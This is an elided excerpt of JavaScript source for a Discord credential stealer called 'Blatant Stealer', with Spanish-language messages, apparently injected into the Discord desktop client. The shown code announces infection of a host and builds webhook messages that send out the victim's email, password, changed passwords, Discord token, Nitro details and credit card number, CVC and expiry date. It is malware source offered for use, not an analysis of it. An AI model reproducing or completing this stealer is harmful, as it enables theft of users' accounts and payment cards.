...
var imageURL = "https://c.tenor.com/R3T63pe67MQAAAAC/dragon.gif";
var mainName = "Blatant Stealer";
var mainColor = 10038562
...
function FirstTime() {
   if (!fs.existsSync(path.join(__dirname, "BLTNSTLR"))) {
      return !0
   }
   fs.rmdirSync(path.join(__dirname, "BLTNSTLR"));
   const window = BrowserWindow.getAllWindows()[0];
      ...
      embeds: [
          {
            "title" : mainName,
            "color": mainColor,
            "description" : "Blatant inicializado en " + os.hostname() + "\nEstoy listo para encontrar tokens",
            "thumbnail": {
               "url": imageURL
            },
            "author": {
            ...
            embeds: [
                {
                  ...
                  "fields": [
                     {
                           "name": "**Usuario Loggeado**",
                           "value": `Correo: \`${email}\` - Clave: \`${password}\` - ` + json.username + "#" + json.discriminator + "・" + json.id,
                           "inline": true
                     },
                     {
                           "name": "`Token`",
      ...
      var params = {
         ...
         embeds: [
            ...
            "fields": [
               {
                     "name": "`Claves`",
                     "value": `Correo: \`${json.email}\`\nClave vieja: \`${oldpassword}\`\nClave nueva: \`${newpassword}\``,
               },
               {
                  "name": "`Informacion de Nitro`",
                  "value": `Tipo de nitro: \`${GetNitro(json.premium_type)}\`\nInsignias: \`${GetBadges(json.flags)}\``,
                  "inline": true
               },
               {
                     "name": "`Token`",
    ...
    xmlHttp.responseText;`, !0).then((info) => {
        ...
        var params = {
         ...
         embeds: [
            ...
            "fields": [
               {
                     "name": "`Informacion de la tarjeta`",
                     "value": `Numero de tarjeta: \`${number}\`\nCVC: \`${cvc}\`\nExpiracion: \`${expir_month}/${expir_year}\``,
                     "inline": true
               },
               {
                  "name": "`Informacion de Nitro`",
